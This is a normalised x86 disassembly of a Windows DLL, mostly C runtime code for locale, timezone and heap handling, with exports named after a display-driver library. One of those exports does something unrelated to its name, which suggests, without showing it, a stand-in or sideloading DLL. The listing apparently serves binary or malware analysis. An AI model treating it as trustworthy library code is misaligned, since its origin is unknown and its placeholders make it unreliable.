mov [ ebp + 0x18 ] esi
jmp r-xdata
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
inc ebx
cmp esi ebx
jle r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push edi
push [ ebp - 0x24 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
cmp edi ebx
jle r-xdata
mov eax ebx
jmp r-xdata
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x1c ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
test edi edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
test esi esi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x1c ]
call sub_10036463
mov eax [ ebp - 0x28 ]
pop ecx
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_10056814
pop ecx
test eax eax
je r-xdata
call sub_1007c030
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_10036463
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_10056814
pop ecx
test eax eax
je r-xdata
call sub_1007c030
mov eax esp
test eax eax
je r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
add eax 0x8
sub_1007d956
push 0x2c
push r--data
call sub_10078b50
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_1002d0ff
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_100125d6
pop ecx
cmp eax ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b659
lea eax [ ebp - 0x24 ]
push eax
call sub_1000dc3a
pop ecx
cmp eax ebx
jne r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_10020a90
pop ecx
mov [ rw-data ] ebx
lea eax [ ebp - 0x28 ]
push eax
call sub_10055f98
pop ecx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
call sub_100382f1
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_1004ccdb
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
call sub_10078b95
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_100617ac
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
push esi
call sub_10078ac0
inc eax
push eax
call sub_10028397
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
push esi
push esi
call sub_10078ac0
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_10005e18
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_10064bd8
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_1001561a
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_1001d4dc
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007dbd9
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push eax
call sub_10020a90
pop ecx
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_100617ac
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_1005d3a9
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_10064bd8
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_1001561a
mov [ eax ] esi
jmp r-xdata
inc esi
inc esi
push esi
call sub_100617ac
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_1007dc70
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_1000b691
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1007dcc2
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_10025450
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push 0x9
call sub_1003fa9e
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
pop esi
sub edi esi
push eax
call sub_100195cc
mov [ esi ] eax
add esi 0x4
mov eax [ edi + esi ]
pop ecx
test eax eax
jne r-xdata
sub_10082a30
push ebp
mov ebp esp
push 0xffffffff
push sub_100829ec
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
push esi
push r--data
mov ecx rw-data
call sub_1005e3c0
mov [ ebp - 0x4 ] esi
push esi
xor eax eax
mov edi 0x7
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x2
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x3
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x4
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_1005e3c0
mov [ ebp - 0x4 ] 0x5
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_1005e3c0
push 0x206
xor eax eax
push esi
push rw-data
mov [ rw-data ] ax
call sub_10078970
push 0x3cf0
push esi
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10078970
push 0x3cf0
push esi
push rw-data
call sub_10078970
push 0x3c
push esi
push rw-data
call sub_10078970
push 0x78
push esi
push rw-data
call sub_10078970
push 0x78
push esi
push rw-data
call sub_10078970
add esp 0x48
push 0x3cf0
push esi
push rw-data
call sub_10078970
push 0x3cf0
push esi
push rw-data
call sub_10078970
xor eax eax
push 0x208
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ax
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
add esp 0x48
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x1450
push esi
push rw-data
call sub_10078970
push 0x1450
push esi
push rw-data
call sub_10078970
add esp 0x48
push 0x1450
push esi
push rw-data
call sub_10078970
push 0x1450
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
mov [ rw-data ] esi
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
push esi
push rw-data
call sub_10078970
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_10078970
add esp 0x48
push j_sub_100129b0
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10025945
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10082df0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10083280
mov [ edx + 0x15 ] al
call sub_10025945
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10082e70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10083160
mov [ edx + 0x15 ] al
call sub_10025945
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10082ef0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_100831c0
mov [ edx + 0x15 ] al
call sub_10025945
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10082f70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10083220
mov [ edx + 0x15 ] al
call sub_10025945
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10083160
push ebp
mov ebp esp
push 0xffffffff
push sub_1007df2a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1000d380
mov ecx [ rw-data ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100831c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007df5a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1000d380
mov ecx [ rw-data ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10083220
push ebp
mov ebp esp
push 0xffffffff
push sub_1007df8a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1000d380
mov ecx [ rw-data ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10083280
push ebp
mov ebp esp
push 0xffffffff
push sub_1007dfba
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1000d380
mov ecx [ rw-data ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100832e0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_1000c130
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x14
j_sub_100173d0
jmp sub_100173d0
sub_10002767
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_100781cd
add esp 0xc
pop ebp
retn
sub_10002780
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x14
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_100027a0
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
pop ebp
retn 0x4
sub_10003588
push 0x1
call sub_1003e989
pop ecx
retn
j_sub_10019b04
jmp sub_10019b04
sub_10003630
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003cede
sub_10004550
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10004559
mov esp [ ebp - 0x18 ]
call sub_1002423f
sub_10004d40
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
retn
push eax
call sub_10065045
pop ecx
sub_10004da0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10004e40
push esi
xor esi esi
mov eax 0xcccccccd
mul ecx
shr edx 0x3
mov ecx edx
inc esi
test ecx ecx
jne r-xdata
mov eax esi
pop esi
retn
sub_1000514f
push ebx
call sub_1001f63f
pop ecx
retn
sub_10005b26
push 0x1
push 0x0
push 0x0
call sub_100781cd
add esp 0xc
retn
sub_10005c7c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000833b
add esp 0x14
pop ebp
retn
ADL_ApplicationProfiles_User_Unload
push 0x0
call [ GetModuleHandleW@IAT ]
movzx eax [ eax + 0x1 ]
cdq
mov ecx 0x5a
idiv ecx
lea eax [ edx + 0x1 ]
retn
sub_10005cf0
mov eax 0x1
retn 0x4
sub_10007512
mov edi edi
push ebp
mov ebp esp
call sub_10044fed
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10007bb0
push ebp
mov ebp esp
pop ebp
jmp sub_10020a90
sub_10008b48
push 0x8
call sub_1003e989
pop ecx
retn
sub_10008f00
push ecx
push esi
call sub_1001f390
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop ecx
retn
sub_100093ff
mov ax [ ecx + 0xc ]
retn
sub_10009404
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_1000942f
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10020a90
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10009537
push 0x0
call sub_10032502
pop ecx
retn
sub_10009d9f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10058482
add esp 0x14
pop ebp
retn
sub_10009ff0
mov eax [ ecx + 0x4 ]
retn
sub_1000a000
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_1000a4a8
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1000a4d0
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_1000a690
push 0xd
call sub_1003e989
pop ecx
retn
sub_1000a699
push 0xc
call sub_1003e989
pop ecx
retn
sub_1000b67e
call sub_10044fed
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1002423f
call eax
sub_1000b691
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10011db1
add esp 0x10
pop ebp
retn
sub_1000b6b0
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_1000b99c
push [ ebp + 0x8 ]
call sub_1001f63f
pop ecx
retn
sub_1000c10e
mov edx [ ebp - 0x14 ]
push edx
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_1000c7e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000c7f4
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10020a90
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1000c910
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000c920
mov eax sub_10040f33
mov [ rw-data ] eax
mov [ rw-data ] sub_1002e6dc
mov [ rw-data ] sub_10058428
mov [ rw-data ] sub_1005f9b1
mov [ rw-data ] sub_10068f58
mov [ rw-data ] eax
mov [ rw-data ] sub_1002bb9f
mov [ rw-data ] sub_10025903
mov [ rw-data ] sub_10025881
mov [ rw-data ] sub_10011eb4
retn
sub_1000d1bf
push 0xd
call sub_1003e989
pop ecx
retn
sub_1000dc20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
add ecx 0x8
push ecx
push 0x5
push eax
call sub_10004e00
add esp 0xc
pop ebp
retn
sub_1000de40
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x14 ]
push eax
call sub_1002dc60
pop edi
pop ebp
retn
sub_1000dee3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
sub_1000e1cf
mov eax [ ecx + 0x10 ]
retn
sub_1000e768
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1003e989
pop ecx
sub_1000eaed
mov al [ ecx + 0xd ]
retn
sub_1000eb46
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003feb0
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1000f8c0
push 0x6
call sub_1003e989
pop ecx
retn
sub_1000ffad
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10020a90
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1000ffc9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100105a3
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
add esp 0x4
push 0x0
push 0x0
call sub_1002050e
int3
sub_100112a0
mov eax [ ecx + 0x4 ]
push eax
call sub_10065045
pop ecx
retn
sub_100113f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10042aa0
pop ebp
retn
sub_100116e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001182b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10011b86
push 0xc
call sub_1003e989
pop ecx
retn
sub_10011b92
push 0xc
call sub_1003e989
pop ecx
retn
sub_10011bc3
and [ esi + 0x70 ] 0xffffffef
retn
sub_100120a3
xor eax eax
inc eax
retn
sub_100120a7
mov esp [ ebp - 0x18 ]
call sub_1002423f
sub_1001251d
mov ecx [ ebp - 0x14 ]
call sub_100324d8
push 0x0
push 0x0
call sub_1002050e
int3
sub_10012603
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_10012811
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_100536ce
add esp 0xc
pop ebp
retn
sub_10012830
mov eax esi
call sub_10054700
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_10012e0d
push [ ebp - 0x14 ]
call sub_100082ec
pop ecx
retn
sub_10012e51
call sub_10044fed
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10044fed
dec [ eax + 0x90 ]
sub_10013368
mov eax 0x1
retn
sub_10014d10
mov [ ecx ] r--data
jmp sub_10019b04
sub_100151bf
push 0xd
call sub_1003e989
pop ecx
retn
sub_100151cb
push 0xc
call sub_1003e989
pop ecx
retn
ADL2_Main_Control_Create
push ebp
mov ebp esp
push ecx
